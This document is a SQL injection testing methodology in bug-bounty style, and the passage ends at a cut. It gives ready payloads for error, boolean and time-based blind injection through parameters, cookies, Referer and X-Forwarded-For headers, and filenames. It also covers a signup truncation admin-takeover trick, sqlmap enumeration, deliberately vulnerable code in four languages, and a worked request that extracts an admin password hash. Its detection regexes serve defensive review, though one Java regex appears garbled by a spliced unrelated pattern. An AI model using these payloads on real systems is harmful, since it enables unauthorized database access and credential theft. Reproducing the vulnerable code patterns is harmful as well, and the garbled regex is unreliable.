# SQL Injection

## Check List

## Methodology

### Black Box

#### Change Table Parameters

{% stepper %}
{% step %}
Log in to the site and look for mechanisms such as calculators or mechanisms that allow you to enter image sizes, etc., or data
{% endstep %}

{% step %}
Trace the request using Burp Suite and check whether values ​​are sent to the server with the POST method and JSON data by changing the numbers and sizes
{% endstep %}

{% step %}
Inject a quote mark (`unitWeight=10'`) into a parameter and submit the request, and check if you get any errors from the server side, such as 500 Internal Server Error
{% endstep %}

{% step %}
The next step is to check whether this error is returned by adding another single quote to the parameter (`unitWeight=10''`)
{% endstep %}

{% step %}
Then use timebase payload injection for SQL like `'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z` to check if the server is responding to you with a delay
{% endstep %}

{% step %}
If the server responds to you with a delay of 10 seconds, it means the server is vulnerable
{% endstep %}

{% step %}
Inspect cookies by modifying their values with SQL payloads (`cookie=value' OR 1=1`), checking if the server responds differently or exposes sensitive data
{% endstep %}
{% endstepper %}

***

#### [Cookie Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#time-based-injection)

{% stepper %}
{% step %}
Intercept browser traffic with a proxy Burp Suite
{% endstep %}

{% step %}
Load the target page so the relevant GET/POST request appears in the proxy
{% endstep %}

{% step %}
Send the request to Repeater (or an editor)
{% endstep %}

{% step %}
Locate the `Cookie:` header and identify parameters ( `lang=...`)
{% endstep %}

{% step %}
Modify the suspicious cookie value to a single quote `'` and send the request
{% endstep %}

{% step %}
Check the server response for SQL errors or 500/DB-syntax messages
{% endstep %}

{% step %}
To confirm, change the value to a second quote (`''`) or otherwise balance the quote and resend; if the error disappears, this further indicates SQLi
{% endstep %}

{% step %}
(Optional verification) Inject a time-based payload compatible with the backend (`IF(1=1,SLEEP(5),0)`) into the cookie and measure response delay
{% endstep %}

{% step %}
If the server responds to you with 5 seconds of delay, it means it is vulnerable
{% endstep %}
{% endstepper %}

***

#### [Time-Based](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#time-based-injection)

{% stepper %}
{% step %}
Identify input fields or parameters in the target application, such as URL query strings (`id=`) or form inputs, that may interact with a database, focusing on features like search, deletion, or data retrieval endpoints
{% endstep %}

{% step %}
Intercept HTTP requests using a proxy tool (Burp Suite) to capture parameters like id or username, analyzing how they are sent to the server for database queries
{% endstep %}

{% step %}
Test for SQL injection by injecting a single quote (`id=187'`) into the parameter and sending the request, observing for server errors (500 Internal Server Error) that indicate unhandled SQL syntax
{% endstep %}

{% step %}
Confirm the absence of verbose error messages in the response, noting generic error pages or no data leakage, suggesting a potential blind SQL injection vulnerability
{% endstep %}

{% step %}
Inject a time-based payload (`id=187 AND SLEEP(5)`) to test for a delay in the server response, confirming time-based SQL injection if the response is delayed by the specified time (5 seconds)
{% endstep %}

{% step %}
Verify the delay by sending a non-sleeping payload `(id=187 AND 1=1`) and comparing response times to ensure the delay is due to the SLEEP command execution
{% endstep %}

{% step %}
Test for boolean-based conditions using payloads like `id=187 AND IF(1=1,SLEEP(5),0)`, checking for a delay when the condition is true and no delay when false (`1=2`)
{% endstep %}

{% step %}
Extract database metadata by injecting payloads like `id=187 AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)` to determine the database version character by character, noting delays for true conditions
{% endstep %}

{% step %}
Determine the database name length using payloads like `id=187 AND IF(LENGTH(database())=10,SLEEP(5),0)`, incrementing the length value until a delay confirms the correct length
{% endstep %}

{% step %}
Extract the database name by iterating through each character position with payloads like `id=187 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)`, testing all possible characters (a-z, 0-9) and noting delays for correct matches
{% endstep %}

{% step %}
Move to the next character position (`SUBSTRING(database(),2,1)='a'`) after identifying the first character, repeating the process until the full database name is extracted
{% endstep %}

{% step %}
Test for additional metadata, such as table names or column names, using payloads like `id=187 AND IF(EXISTS(SELECT table_name FROM information_schema.tables WHERE table_name='users'),SLEEP(5),0)`to confirm the presence of specific tables
{% endstep %}
{% endstepper %}

***

#### [Referrer Header ](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)

{% stepper %}
{% step %}
Referer is another HTTP header which can be vulnerable to SQL injection once the application is storing it in database without sanitizing it. It's an optional header field that allows the client to specify
{% endstep %}

{% step %}
Go to the homepage and trace the request using Burp Suite
{% endstep %}

{% step %}
Then send the request to the Repeater and check the Referrer header using the following payload

```http
GET /index.php HTTP/1.1
Host: [host]
User-Agent: 
Referer: http://www.yaboukir.com' or 1/*
```
{% endstep %}

{% step %}
Then check if the server shows any strange behavior after injecting the payload into this header
{% endstep %}
{% endstepper %}

***

#### [X-Forwarded-For Header](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)

{% stepper %}
{% step %}
Log in to the target site and record requests using Burp Suite
{% endstep %}

{% step %}
Identify the X-Forwarded-For header in logged requests
{% endstep %}

{% step %}
Routes that set and use the X-Forwarded-For header on sites and usually store its values ​​in the database : `/login` `/signup` `/register` `/logout` `/user/profile` `/profile/update` `/checkout` `/purchase` `/cart/checkout` `/api/*` `/comments` `/comment/post` `/posts` `/posts/create` `/sessions` `/session`\
`/password/reset`
{% endstep %}

{% step %}
Send the request by going to these routes and then setting this header (or if it already exists) and then examine the server response like the following request

```http
POST /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Connection: close
X-Forwarded-For: 127.0.0.1

username=alice&password=Password123
```
{% endstep %}

{% step %}
Now, using a simple payload like the one below, we will check this header to see if the server is giving us an unusual or strange response

```http
POST /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Connection: close
X-Forwarded-For: 127.0.0.1' OR 1=1 --

username=alice&password=Password123
```
{% endstep %}

{% step %}
If an error occurs, test a false condition payload like ' OR 1=2 -- and compare

{% hint style="info" %}
`X-Forwarded-For: 127.0.0.1' OR 1=1 --` succeeds (200 OK), but `' OR 1=2 --` errors (500), proving injectable
{% endhint %}
{% endstep %}

{% step %}
If the attack was successful, we can extract the database version using the following payload

```
IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)
```
{% endstep %}
{% endstepper %}

***

#### [Time-based blind](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#blind-injection)

{% stepper %}
{% step %}
Navigate to pages on the target website that display database-driven results, such as search pages, product listings, or user dashboards, often found at URLs like `/search`, `/results`, `/list`, `/products`, or `/dashboard`. These pages typically use query parameters for sorting or filtering
{% endstep %}

{% step %}
Look for query parameters controlling sorting or filtering, such as `sortBy`, order, sort, filter, or column, in the URL or form submissions, as these are often passed directly to SQL queries
{% endstep %}

{% step %}
Modify the identified parameter (`sortBy`) with a simple time-based payload like `1 AND SLEEP(5) --` to introduce a 5-second delay if the query executes
{% endstep %}

{% step %}
Use a browser or Burp Suite to send the modified request and measure the response time. A \~5-second delay confirms the payload executed in the database
{% endstep %}

{% step %}
Send a non-delaying request with the original parameter value (`sortBy=1`) or a neutral payload (`sortBy=1 AND 1=1 --`) to ensure no delay occurs, verifying the injection
{% endstep %}

{% step %}
Inject a payload like `1 AND IF(SUBSTRING(DB_NAME(),1,1)='A',SLEEP(5),0) --` to test if the database name starts with 'A', noting a delay for true conditions. Iterate through characters (`A-Z, 0-9`) to extract the name
{% endstep %}

{% step %}
Apply the same payload to similar parameters (order, filter) on other database-driven pages (`/products,` `/list`) to identify additional injection points
{% endstep %}
{% endstepper %}

***

#### [Testing on Author-Like Parameters](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#time-based-injection)

{% stepper %}
{% step %}
Go to the points on the target site where you can create a list or a book or a quiz Or for example in the `/archive` path, And especially pages where we as a user can publish or search for something
{% endstep %}

{% step %}
Locate the authors parameter in the POST request body, used for filtering or querying author-related data, making it a candidate for SQL injection
{% endstep %}

{% step %}
Modify the authors parameter with a time-based payload like `Hurlburt'XOR(if(now()=sysdate(),sleep(4),0))OR'` to induce a 4-second delay if the query executes
{% endstep %}

{% step %}
And send this request using Burp Suite and check the server response time
{% endstep %}

{% step %}
If the server response time is equal to the time specified in the payload, this parameter is vulnerable
{% endstep %}
{% endstepper %}

***

#### [Filename Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#time-based-injection)

{% stepper %}
{% step %}
Log into the target site and intercept the requests using the Burp Suite tool
{% endstep %}

{% step %}
Then identify and check the file upload functionality on the site. This functionality is usually in the profiles, tickets, user settings, and ...
{% endstep %}

{% step %}
Then click on the Upload File option and intercept the request using intercept in Burp Suite
{% endstep %}

{% step %}
Now put `--sleep(15).png` in the payload file name and then check the server response to see if it responded to us after 15 seconds
{% endstep %}

{% step %}
If the server response takes 15 seconds, the SQL Injection vulnerability in the file name is confirmed and it is vulnerable
{% endstep %}
{% endstepper %}

***

#### Signup Process

{% stepper %}
{% step %}
Enter a username and email in the Signup form and submit it, capturing the request with Burp Suite to inspect field validation and database behavior
{% endstep %}

{% step %}
Locate the email or username parameter in the POST request body, noting if the application allows duplicate usernames with unique emails, indicating potential truncation
{% endstep %}

{% step %}
Create a second account with the same username and a modified email (`r3dbuck3t@bucket.com+++++hacker`), intercepting the request with Burp Suite to add encoded spaces and extra characters.
{% endstep %}

{% step %}
Send the request and check for a 200 response, confirming the account was created despite the extra characters, suggesting truncation occurred
{% endstep %}

{% step %}
Log in with the original email (`r3dbuck3t@bucket.com`) and the same password to verify the account authenticates, proving truncation allows duplicate access
{% endstep %}

{% step %}
Identify an admin email (`admin@book.htb`) from public pages like Contact Us, then repeat the process with `admin@book.htb++++++hacker` to create a duplicate admin account
{% endstep %}

{% step %}
Attempt to log in with the original admin email (`admin@book.htb`) and the new password, checking if it grants user-level access or redirects to an admin portal
{% endstep %}

{% step %}
If user access is granted, perform directory enumeration (with `Gobuster`) to find an admin portal (`/admin`), then try logging in again to verify admin privileges
{% endstep %}
{% endstepper %}

***

#### Blind SQL Injection

{% stepper %}
{% step %}
Perform passive reconnaissance to identify application endpoints using tools such as URLFinder
{% endstep %}

{% step %}
Locate an endpoint that accepts user-controlled parameters, for example

```hurl
home.aspx?flag=change_pwd&btnchk=0&txt_userid=770435
```
{% endstep %}

{% step %}
Identify the parameter,like `txt_userid` as a potential injection point
{% endstep %}

{% step %}
Inject a Boolean-based Blind SQL Injection payload into the vulnerable parameter

```hurl
flag=change_pwd&btnchk=0&txt_userid=770435') OR NOT 1=1 AND ('A'='A
```
{% endstep %}

{% step %}
Send the crafted request to the server
{% endstep %}

{% step %}
Observe the application’s response and compare it with the normal response
{% endstep %}

{% step %}
Confirm the vulnerability by detecting a difference in application behavior when the injected Boolean condition evaluates to false versus a normal request
{% endstep %}

{% step %}
After confirming Blind SQL Injection, use an automated exploitation tool such as SQLMap against the vulnerable parameter
{% endstep %}

{% step %}
Run `SQLMap` to enumerate database information, starting with listing all available databases
{% endstep %}

{% step %}
Verify successful exploitation by confirming database enumeration without authentication
{% endstep %}

{% step %}
Conclude that the application is vulnerable to Blind (Boolean-based) SQL Injection, resulting in unauthorized database access
{% endstep %}
{% endstepper %}

***

### White Box

#### SQL Injection via Tenant Routing Header in Database Search Path Construction

{% stepper %}
{% step %}
Identify the application's request-processing architecture and extract the middleware execution order. Determine which middleware components execute before authentication and whether user-controlled input is processed prior to authentication

```
HTTP Request -> Apache/mod_wsgi -> Django
  -> ApiLogMiddleware
  -> SiteMiddleware
  -> PostgresConnection
  -> AuthMiddleware
  -> BruteForceProtection
  -> View/Controller
```
{% endstep %}

{% step %}
Identify middleware components that process HTTP headers and trace the data flow from the header to sensitive areas of the application
{% endstep %}

{% step %}
Locate methods that receive header values and determine whether validation, allowlists, regex checks, or character filtering are applied to the received data

{% tabs %}
{% tab title="C#" %}
```csharp
private bool GetHeaderSite(HttpRequest request)
{
    var site = request.Headers["HTTP_SITE"];

    if (site != null)
    {
        request.Headers["SITE"] = site.ToLower();
    }

    return site != null;
}
```
{% endtab %}

{% tab title="Java" %}
```java
private boolean getHeaderSite(HttpServletRequest request)
{
    String site = request.getHeader("HTTP_SITE");

    if (site != null)
    {
        request.setAttribute("SITE", site.toLowerCase());
    }

    return site != null;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private function get_header_site($request)
{
    $site = $request->server->get('HTTP_SITE');

    if ($site !== null) {
        $request->server->set('SITE', strtolower($site));
    }

    return $site !== null;
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
getHeaderSite(request)
{
    const site = request.headers['http_site'];

    if (site != null)
    {
        request.headers['site'] = site.toLowerCase();
    }

    return site != null;
}    
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="C#" %}
```csharp
public void Invoke(HttpRequest request)
{
    if (!EmsConsts.SITES_ENABLED)
    {
        request.Headers["SITE"] = EmsConsts.DEFAULT_VDOM;
    }
    else if (!this.GetHeaderSite(request))
    {
        this.GetSubdomainSite(request);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void call(HttpServletRequest request)
{
    if (!EmsConsts.SITES_ENABLED)
    {
        request.setAttribute("SITE", EmsConsts.DEFAULT_VDOM);
    }
    else if (!this.getHeaderSite(request))
    {
        this.getSubdomainSite(request);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function __invoke($request)
{
    if (!EmsConsts::SITES_ENABLED) {
        $request->server->set('SITE', EmsConsts::DEFAULT_VDOM);
    } elseif (!$this->get_header_site($request)) {
        $this->get_subdomain_site($request);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
invoke(request)
{
    if (!EmsConsts.SITES_ENABLED)
    {
        request.headers['site'] = EmsConsts.DEFAULT_VDOM;
    }
    else if (!this.getHeaderSite(request))
    {
        this.getSubdomainSite(request);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Trace all values stored in `request.META` from headers and determine which application components they are propagated to
{% endstep %}

{% step %}
Identify locations where user-supplied data is used in database connection settings, queries, connection strings, or database contexts

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
class PostgresConnection
{
    public PostgresConnection(string vdom, ...)
    {
        this.db_name = $"fcm_{vdom}";
        this.searchpath = $"SET search_path TO '{this._db_prefix}{this.db_name}', public, addons";
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
class PostgresConnection {
    public PostgresConnection(String vdom, ...) {
        this.db_name = String.format("fcm_%s", vdom);
        this.searchpath = String.format(
            "SET search_path TO '%s%s', public, addons",
            this._db_prefix,
            this.db_name
        );
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class PostgresConnection
{
    public function __construct($vdom, ...)
    {
        $this->db_name = "fcm_{$vdom}";
        $this->searchpath = "SET search_path TO '{$this->_db_prefix}{$this->db_name}', public, addons";
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class PostgresConnection {
    constructor(vdom, ...)
    {
        this.db_name = `fcm_${vdom}`;
        this.searchpath = `SET search_path TO '${this._db_prefix}${this.db_name}', public, addons`;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Determine whether user-controlled data is directly inserted into SQL strings, query templates, or format strings
{% endstep %}

{% step %}
Identify all queries executed before authentication and determine whether any portion of those queries is constructed using user-controlled data

{% tabs %}
{% tab title="C#" %}
```csharp
public void Execute(string query, ...)
{
    this._connection.Execute(this.searchpath);
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void execute(String query, ...)
{
    this._connection.execute(this.searchpath);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function execute($query, ...)
{
    $this->_connection->execute($this->searchpath);
}    
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
execute(query, ...)
{
    this._connection.execute(this.searchpath);
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Where user-controlled data is inserted into queries, determine whether an attacker can break out of the current context (quote breakout), inject a new statement, or comment out the remainder of the query

```sql
SET search_path TO 'fcm_x'; SELECT pg_sleep(5)--', public, addons
```
{% endstep %}

{% step %}
Identify and review all headers that influence database routing, tenant selection, schema selection, search paths, or request-processing context
{% endstep %}

{% step %}
Review the files and classes responsible for database connection management and look for dynamic query construction using user-controlled data
{% endstep %}

{% step %}
Across different product versions, review middleware, routing, and database connection files to identify areas that have recently been rewritten or refactored
{% endstep %}

{% step %}
During refactor analysis, inspect classes and files whose size, structure, or logic has changed and identify new paths through which user-controlled data can reach database queries
{% endstep %}
{% endstepper %}

***

#### SQL Injection via Dynamic Sorting Projection in Enterprise Data Grids

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus intensely on administrative dashboards, reporting interfaces, or list views that utilize rich client-side data grids (e.g., ag-Grid, Kendo UI, DataTables)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the Data Grid projection architecture. Enterprise grids send highly complex JSON payloads or query strings containing pagination, filtering, and sorting parameters (e.g., `?sortBy=department.name&sortOrder=DESC`)
{% endstep %}

{% step %}
Investigate the backend implementation of the sorting logic. Modern Object-Relational Mappers (ORMs) excel at securely parameterizing `WHERE` clauses. However, ORMs fundamentally struggle to parameterize `ORDER BY` clauses because SQL standards do not allow column names to be passed as bind parameters
{% endstep %}

{% step %}
Observe the engineering optimization: To avoid writing and maintaining hundreds of lines of `switch` statements to map frontend string parameters to strict backend entity properties, developers utilize "Dynamic Query Engines" or "Raw SQL Projections"
{% endstep %}

{% step %}
Analyze the decompiled Repository or Data Access Layer. Discover that the developer extracts the `sortBy` parameter from the HTTP request and directly interpolates it into a raw SQL fragment appended to the ORM's execution tree
{% endstep %}

{% step %}
Understand the architectural assumption: The developer explicitly assumes that the frontend data grid strictly controls the `sortBy` parameter, emitting only valid, hardcoded column names originating from the UI dropdown menus. They fail to validate the column name against a strict backend allowlist
{% endstep %}

{% step %}
Verify the database dialect and structure. Because the vulnerability exists within the `ORDER BY` clause, traditional UNION-based or Error-based SQL injection techniques often fail due to syntax constraints
{% endstep %}

{% step %}
Recognize that `ORDER BY` injections require Time-Based Blind or Boolean-Based Blind exploitation techniques using conditional logic (e.g., `CASE WHEN (condition) THEN column_a ELSE column_b END`)
{% endstep %}

{% step %}
Intercept a legitimate data grid sorting request
{% endstep %}

{% step %}
Inject a Time-Based Blind SQL payload directly into the `sortBy` parameter
{% endstep %}

{% step %}
Monitor the HTTP response time. If the backend execution time increases predictably according to your injected delay, the dynamic sorting projection engine is vulnerable
{% endstep %}

{% step %}
Systematically exploit the Time-Based oracle to extract administrative password hashes, internal session tokens, or sensitive intellectual property byte-by-byte

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:OrderByRaw\s*\(\s*\$".*\{.*\}|FromSqlRaw\s*\(.*\{.*\}|ORDER\s+BY\s+\$"|ORDER\s+BY\s+.*\+.*sort|sortBy\s*=\s*Request\.(Query|Form))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:ORDER\s+BY\s+["']\s*\+\s*sort(Field|Column)|ORDER\s+BY\s+\+|createNativeQuery\s*\(.*ORDER\s+BY.*\+|sort(Column|Field)\s*=\s*request\.getParameter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:orderByRaw\s*\(\s*\$request->.*sort|orderByRaw\s*\(\s*\$.*\{.*\}|ORDER\s+BY\s+\.\s*\$|ORDER\s+BY\s*\.\s*\$sort(Column|Field)|request\(\s*['"]sort)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:ORDER\s+BY\s+\$\{sort(Column|Field)\}|ORDER\s+BY\s+.*\+\s*sort|order\s*:\s*req\.query\.sort|req\.query\.(sort|sortBy|sortColumn).*query)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
OrderByRaw\(\$"\{.*sortBy|FromSqlRaw\(.*\{|ORDER\s+BY.*\+.*sort
```
{% endtab %}

{% tab title="Java" %}
```regexp
ORDER\s+BY\s+"\s*\+\s*sort(Field|Column)|createNativeQuery\(.*ORDER\s+BY.*\+
```
{% endtab %}

{% tab title="PHP" %}
```regexp
orderByRaw\(\$request->.*sort|ORDER\s+BY\s+\.\s*\$sort(Column|Field)|orderByRaw\(\$.*\{
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
ORDER\s+BY\s+\$\{sortColumn\}|ORDER\s+BY.*\+\s*sort|req\.query\.(sort|sortBy|sortColumn)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/api/v1/employees")]
public async Task<IActionResult> GetEmployees([FromQuery] DataGridRequest request) 
{
    var query = _context.Employees.AsQueryable();

    // Secure parameterized filtering
    if (!string.IsNullOrEmpty(request.SearchTerm)) 
    {
        query = query.Where(e => e.Name.Contains(request.SearchTerm));
    }

    // [1]
    // [2]
    // [3]
    if (!string.IsNullOrEmpty(request.SortBy)) 
    {
        var sortDirection = request.SortDescending ? "DESC" : "ASC";
        
        // [4]
        query = query.OrderByRaw($"{request.SortBy} {sortDirection}");
    }

    var results = await query.Skip(request.Skip).Take(request.Take).ToListAsync();
    return Ok(results);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping("/api/v1/employees")
public ResponseEntity<?> getEmployees(@ModelAttribute DataGridRequest request) {
    // [1]
    // [2]
    // [3]
    StringBuilder sql = new StringBuilder("SELECT * FROM employees WHERE name LIKE :searchTerm ");
    
    if (request.getSortBy() != null && !request.getSortBy().isEmpty()) {
        String sortDirection = request.isSortDescending() ? "DESC" : "ASC";
        // [4]
        sql.append("ORDER BY ").append(request.getSortBy()).append(" ").append(sortDirection);
    }

    Query query = entityManager.createNativeQuery(sql.toString(), Employee.class);
    query.setParameter("searchTerm", "%" + request.getSearchTerm() + "%");
    
    query.setFirstResult(request.getSkip());
    query.setMaxResults(request.getTake());

    return ResponseEntity.ok(query.getResultList());
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function getEmployees(Request $request) 
{
    $query = DB::table('employees');

    if ($request->has('searchTerm')) {
        $query->where('name', 'like', '%' . $request->input('searchTerm') . '%');
    }

    // [1]
    // [2]
    // [3]
    if ($request->has('sortBy')) {
        $sortDirection = $request->input('sortDescending') ? 'DESC' : 'ASC';
        
        // [4]
        $query->orderByRaw($request->input('sortBy') . ' ' . $sortDirection);
    }

    $results = $query->skip($request->input('skip'))->take($request->input('take'))->get();
    return response()->json($results);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/api/v1/employees', async (req, res) => {
    let searchTerm = req.query.searchTerm || '';
    let sortBy = req.query.sortBy;
    let sortDirection = req.query.sortDescending === 'true' ? 'DESC' : 'ASC';

    // [1]
    // [2]
    // [3]
    let sql = 'SELECT * FROM employees WHERE name LIKE ? ';
    let params = [`%${searchTerm}%`];

    if (sortBy) {
        // [4]
        sql += `ORDER BY ${sortBy} ${sortDirection} `;
    }

    sql += 'LIMIT ? OFFSET ?';
    params.push(parseInt(req.query.take) || 50, parseInt(req.query.skip) || 0);

    let results = await db.query(sql, params);
    res.json(results);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture supports complex, dynamic data grids requiring flexible sorting across dozens of distinct columns, \[2] The developer correctly utilizes ORM parameterization or prepared statements to sanitize standard `WHERE` clause inputs, \[3] The performance and maintenance optimization: The developer abandons explicit property mapping. Instead of validating the frontend string against the internal database schema, they dynamically accept the client-provided string, \[4] The fatal boundary collapse. Because SQL database engines do not support binding column names via prepared statements, the developer forces the raw, untrusted string directly into the SQL AST execution plan. The assumption that the frontend strictly dictates the input allows an attacker to manipulate the `ORDER BY` clause, establishing an arbitrary execution context

```http
// 1. Attacker interacts with the employee directory data grid.
// 2. Attacker injects a PostgreSQL Time-Based Blind payload into the sortBy parameter.
// The payload forces the database to sleep for 5 seconds if the first character of the admin's password hash is 'a'.

GET /api/v1/employees?skip=0&take=50&sortBy=(CASE+WHEN+(SELECT+SUBSTRING(password_hash,1,1)+FROM+users+WHERE+role='admin')='a'+THEN+pg_sleep(5)+ELSE+id+END) HTTP/1.1
Host: dashboard.enterprise.tld
Authorization: Bearer <low_privilege_token>

// 3. The backend executes the query.
// SELECT * FROM employees ORDER BY (CASE WHEN (SELECT SUBSTRING(password_hash,1,1) FROM users WHERE role='admin')='a' THEN pg_sleep(5) ELSE id END) ASC

// 4. The attacker times the HTTP response. A 5-second delay confirms the boolean state, 
// allowing systematic extraction of the entire database.
```
{% endstep %}

{% step %}
To support complex frontend components without writing unmaintainable switch statements, the backend architecture bypassed the ORM's structural safety mechanisms for the `ORDER BY` clause. By blindly trusting the dynamically supplied column name, the developers introduced a critical injection point that survives standard static analysis tools looking for generic `WHERE` clause vulnerabilities. The attacker exploits this by injecting complex conditional logic directly into the sorting pipeline. The database executes the injected subqueries and relies on the `pg_sleep()` function to broadcast the resulting boolean states back to the attacker via network latency. This Time-Based oracle enables the attacker to silently map the database schema and exfiltrate highly confidential administrative credentials without triggering standard WAF SQLi signatures
{% endstep %}
{% endstepper %}

***

#### Second-Order SQL Injection via Telemetry Bulk Upsert Offloading

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on high-throughput asynchronous ingestion endpoints, such as Webhooks, IoT telemetry streams, or bulk financial transaction APIs
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify an Event-Driven architecture. To handle thousands of requests per second, the synchronous HTTP API does not write directly to the database. Instead, it validates the JSON schema, authenticates the user, and pushes the raw JSON payload to a message broker (e.g., Apache Kafka, RabbitMQ)
{% endstep %}

{% step %}
Investigate the background Kafka Consumer responsible for draining the message queue and persisting the data to the relational database
{% endstep %}

{% step %}
Discover the database optimization: Standard ORMs (like Entity Framework or Hibernate) process `INSERT` statements sequentially. Executing 10,000 individual `INSERT` commands causes crippling transaction log contention and network round-tripping, destroying background worker throughput
{% endstep %}

{% step %}
Observe the custom "Bulk Upsert" solution. To achieve extreme performance, backend engineers abandon the ORM and write a custom string-builder routine to construct a single, massive native SQL statement: `INSERT INTO Telemetry (Id, DeviceId, Metadata) VALUES ('1','A','Data1'), ('2','B','Data2')...`
{% endstep %}

{% step %}
Analyze the trust assumption inside the background worker. The developer assumes that because the synchronous API successfully parsed the payload into a valid JSON object, the data is structurally safe. They fail to realize that valid JSON strings can still contain raw SQL syntax (e.g., `'`)
{% endstep %}

{% step %}
Verify that the synchronous API does _not_ apply SQL escaping, because escaping is traditionally the exclusive responsibility of the ORM (which the API assumes will be used later)
{% endstep %}

{% step %}
Formulate the attack chain. Send a perfectly valid JSON payload to the synchronous API. Inside a string value (e.g., the `DeviceId` or `Metadata` field), inject a raw SQL syntax breaker followed by a malicious subquery or secondary statement
{% endstep %}

{% step %}
The synchronous API validates the JSON, finds no structural errors, and places the payload onto the Kafka queue
{% endstep %}

{% step %}
The background worker consumes a batch of 5,000 messages. It iterates through the batch, blindly concatenating your injected payload into the raw `VALUES` string
{% endstep %}

{% step %}
The worker executes the massive SQL command. Your injected syntax breaks out of the intended value tuple, truncates the active `INSERT` statement, and executes an arbitrary, highly destructive SQL command (e.g., `UPDATE Users SET Role = 'Admin'`) under the context of the highly privileged background worker database role

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:StringBuilder[\s\S]{0,150}?INSERT\s+INTO[\s\S]{0,100}?VALUES|AppendFormat\s*\(\s*".*VALUES.*\{|\$".*INSERT\s+INTO.*\{.*\}|SqlCommand\s*\(\s*.*INSERT\s+INTO.*\+)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:if\s*\(\s*request\.getMethod\(\)\.equals\s*\(\s*"OPTIONS"\s*\)\s*\)\s*\{\s*request\.setAttribute\s*\(\s*"skipAuth"|request\.getMethod\(\)\.equalsIgnoreCase\s*\(\s*"OPTIONS"\s*\)|CorsFilter[\s\S]{0,120}?OPTIONS|OncePerRequestFilter[\s\S]{0,120}?OPTIONS)\b(?:StringBuilder[\s\S]{0,150}?INSERT\s+INTO[\s\S]{0,100}?VALUES|append\s*\(\s*".*INSERT\s+INTO|String\.format\s*\(.*INSERT\s+INTO|createNativeQuery\s*\(.*INSERT\s+INTO.*\+)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$sql\s*\.\=\s*sprintf\s*\(\s*".*INSERT\s+INTO.*'\s*,\s*'\$|\$sql\s*=\s*".*INSERT\s+INTO.*\$|sprintf\s*\(\s*".*VALUES.*%s|mysql_query\s*\(.*INSERT\s+INTO)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:sql\s*\+=\s*`\('\$\{.*\}'\)`|`INSERT\s+INTO.*\$\{.*\}`|query\s*\(\s*`.*INSERT\s+INTO.*\$\{|db\.(query|execute)\s*\(.*INSERT\s+INTO.*\+)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
StringBuilder.*INSERT\s+INTO.*VALUES|AppendFormat\(.*INSERT\s+INTO|INSERT\s+INTO.*\$\{
```
{% endtab %}

{% tab title="Java" %}
```regexp
StringBuilder.*INSERT\s+INTO.*VALUES|append\(.*INSERT\s+INTO|String\.format\(.*INSERT\s+INTO
```
{% endtab %}

{% tab title="PHP" %}
